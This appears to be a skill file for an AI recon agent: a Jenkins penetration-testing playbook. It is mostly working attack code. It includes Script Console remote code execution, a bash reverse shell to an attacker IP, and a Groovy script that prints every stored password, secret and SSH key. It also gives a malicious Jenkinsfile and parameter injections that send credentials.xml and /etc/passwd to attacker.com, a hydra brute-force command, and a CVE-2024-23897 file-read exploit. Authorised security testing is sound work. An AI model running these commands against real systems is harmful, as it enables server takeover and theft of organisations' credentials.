<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: jenkins
description: Security testing playbook for Jenkins CI/CD covering unauthenticated access, Script Console RCE, Groovy injection, job configuration abuse, credential extraction, and known CVEs
---

# Jenkins Security Testing

Jenkins is the most common CI/CD server in enterprise environments. Attack surface: unauthenticated Script Console (instant RCE), job configuration injection, credential store extraction, Groovy script execution, and numerous unpatched CVEs.

---

## Reconnaissance

### Discovery

    # Port scanning
    nmap -p 8080,8443,50000 <target> -sV --open

    # Ports:
    # 8080  — Jenkins HTTP (most common)
    # 8443  — Jenkins HTTPS
    # 50000 — Jenkins agent port (JNLP)

    # Jenkins fingerprinting
    GET http://<target>:8080/
    # Response: Jenkins login page or dashboard
    # Header: X-Jenkins: 2.401.3   ← exact version

    GET /login                      # Login page
    GET /api/json                   # JSON API (reveals version, jobs if unauth)
    GET /api/json?pretty=true
    GET /asynchPeople/              # User list
    GET /people/                    # User enumeration

---

## Unauthenticated Access

    # Test if anonymous access is enabled (no auth required)
    curl -s http://<target>:8080/api/json?pretty=true
    # If returns job list → anonymous read access enabled

    curl -s http://<target>:8080/script
    # If returns Script Console → INSTANT RCE

    # Enumerate all jobs (unauthenticated):
    curl -s "http://<target>:8080/api/json?tree=jobs[name,url,builds[number,result]]&pretty=true"

    # Get job config (may contain credentials, SCM tokens):
    curl -s "http://<target>:8080/job/<job-name>/config.xml"

---

## Script Console — Remote Code Execution

Jenkins Script Console executes arbitrary Groovy code. If accessible = instant RCE.

    # Access Script Console:
    GET /script                     # Web UI Script Console
    GET /scriptText                 # API version

    # Execute commands via Script Console (Groovy):
    "id".execute().text
    "ls /".execute().text
    "cat /etc/passwd".execute().text

    # More reliable execution:
    def cmd = ["bash", "-c", "id"].execute()
    println cmd.text

    # Reverse shell via Script Console:
    def cmd = ["bash", "-c", "bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1"].execute()

    # Execute via API (no browser needed):
    curl -X POST "http://<target>:8080/scriptText" \
      --data 'script=println+"id".execute().text' \
      --cookie "JSESSIONID=<session>"

    # With credentials:
    curl -X POST "http://<admin>:<password>@<target>:8080/scriptText" \
      --data 'script=println+"id".execute().text'

    # Using crumb (CSRF token required for POST):
    CRUMB=$(curl -s "http://<admin>:<pass>@<target>:8080/crumbIssuer/api/json" | python3 -c "import sys,json; print(json.load(sys.stdin)['crumb'])")
    curl -X POST "http://<admin>:<pass>@<target>:8080/scriptText" \
      -H "Jenkins-Crumb: $CRUMB" \
      --data-urlencode 'script=println "id".execute().text'

---

## Credential Extraction

Jenkins stores credentials in the credential store. With script access, extract all secrets:

    # Extract all credentials via Script Console:
    import com.cloudbees.plugins.credentials.*
    import com.cloudbees.plugins.credentials.common.*
    import com.cloudbees.plugins.credentials.domains.*
    import com.cloudbees.plugins.credentials.impl.*
    import com.cloudbees.jenkins.plugins.sshcredentials.impl.*
    import org.jenkinsci.plugins.plaincredentials.*

    def credentials = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
        com.cloudbees.plugins.credentials.Credentials.class,
        jenkins.model.Jenkins.instance, null, null
    )

    for (c in credentials) {
        if (c instanceof UsernamePasswordCredentialsImpl) {
            println "Username: ${c.username}, Password: ${c.password.plainText}"
        } else if (c instanceof StringCredentialsImpl) {
            println "Secret: ${c.secret.plainText}"
        } else if (c instanceof BasicSSHUserPrivateKey) {
            println "SSH Key: ${c.privateKey}"
        }
    }

    # Extract Jenkins master key and encrypted secrets:
    println new File('/var/jenkins_home/secrets/master.key').text
    println new File('/var/jenkins_home/credentials.xml').text

---

## Job Configuration Abuse

    # Trigger a build with custom parameters (if build permission granted):
    curl -X POST "http://<target>:8080/job/<job-name>/build" \
      --data "json={\"parameter\": [{\"name\":\"PARAM\", \"value\":\"value\"}]}"

    # If job has "Execute shell" build step — inject into parameters:
    # Parameter default: `ls -la`
    # Attack: `ls -la; curl attacker.com/$(cat /etc/passwd | base64)`

    # Read job workspace (may contain secrets, built artifacts):
    GET /job/<job-name>/ws/                       # Job workspace file browser
    GET /job/<job-name>/ws/.env                   # .env in workspace
    GET /job/<job-name>/ws/config/secrets.json

    # Enumerate build history (may reveal secrets in console output):
    GET /job/<job-name>/1/console                 # Build 1 console output
    GET /job/<job-name>/lastSuccessfulBuild/console

---

## Pipeline / Jenkinsfile Injection

If user controls Jenkinsfile content or pipeline script parameters:

    // Malicious Jenkinsfile:
    pipeline {
        agent any
        stages {
            stage('Exfil') {
                steps {
                    sh 'cat /var/jenkins_home/credentials.xml | curl -F "data=@-" https://attacker.com/'
                }
            }
        }
    }

    // Inline script injection (if parameter passed to sh step):
    sh "echo ${params.INPUT}"    // Vulnerable if INPUT is not sanitized
    // Inject: `; curl attacker.com/$(id|base64);`

---

## Authentication Bypass / Brute Force

    # Default credentials to try:
    admin:admin
    admin:password
    admin:jenkins
    jenkins:jenkins

    # Brute force login:
    hydra -l admin -P /usr/share/wordlists/rockyou.txt http-form-post \
      "http://<target>:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=Sign+in:loginError"

    # Jenkins uses JSESSIONID cookie after login — no rate limiting in old versions

    # API token brute force (if user enumerated):
    curl -u admin:<token> http://<target>:8080/api/json

---

## Jenkins API Exploitation

    # List all jobs and build status:
    GET /api/json?tree=jobs[name,url,lastBuild[result,timestamp,url]]&depth=2

    # List all users:
    GET /asynchPeople/api/json

    # Get user info (token?):
    GET /user/<username>/api/json

    # List installed plugins (check for vulnerable versions):
    GET /pluginManager/api/json?depth=1&tree=plugins[shortName,version,active]

    # List node/agent info (may reveal internal hostnames):
    GET /computer/api/json?depth=1

---

## Sensitive File Locations

    # Jenkins home directory (default: /var/jenkins_home or /var/lib/jenkins)
    /var/jenkins_home/secrets/master.key          # Master encryption key
    /var/jenkins_home/secrets/hudson.util.Secret  # Secret key
    /var/jenkins_home/credentials.xml             # Encrypted credentials
    /var/jenkins_home/config.xml                  # Main config (users, security matrix)
    /var/jenkins_home/users/                      # User configs + API tokens
    /var/jenkins_home/jobs/                       # Job configs + build history

    # Read via Script Console if accessible:
    println new File('/var/jenkins_home/secrets/master.key').text

---

## Common CVEs

| CVE | Component | Impact |
|-----|-----------|--------|
| CVE-2024-23897 | Jenkins CLI | Arbitrary file read (critical) |
| CVE-2023-27898 | Jenkins | XSS → RCE via update center |
| CVE-2022-36881 | Git plugin | MITM on SCM checkout |
| CVE-2019-1003000 | Script Security | Sandbox bypass → RCE |
| CVE-2018-1000861 | Stapler | Arbitrary code execution |
| CVE-2017-1000353 | Jenkins | Java deserialization RCE |
| CVE-2016-0792 | Jenkins | JNLP agent RCE |

    # CVE-2024-23897 — Arbitrary file read via CLI:
    java -jar jenkins-cli.jar -s http://<target>:8080/ help "@/etc/passwd"
    java -jar jenkins-cli.jar -s http://<target>:8080/ help "@/var/jenkins_home/secrets/master.key"

    # Nuclei:
    nuclei -t cves/ -tags jenkins -u http://<target>:8080/
    nuclei -t exposures/jenkins/ -u http://<target>:8080/

---

## Pro Tips

1. Always check `/script` first — unauthenticated Script Console = instant RCE
2. `/api/json` without auth = reveals all job names + build history (info disclosure)
3. Job workspace (`/job/<name>/ws/`) often contains `.env`, keys, certificates
4. CVE-2024-23897 (file read via CLI) is widely unpatched — always test
5. Credentials in Jenkins are only encrypted with master.key — if you read both, you have plaintext
6. `asynchPeople/` lists all users (for brute force targeting) without authentication
7. Pipeline script injection via unsanitized `sh "${params.INPUT}"` is extremely common

## Summary

Jenkins testing = `/script` for unauthenticated RCE + credential extraction via Groovy + CVE-2024-23897 CLI file read + job workspace sensitive file exposure. Script Console access = complete server compromise — extract master.key + credentials.xml to decrypt all stored secrets. Always enumerate jobs, check workspace files, and test CVE-2024-23897 regardless of version since patching is slow in enterprise Jenkins installations.
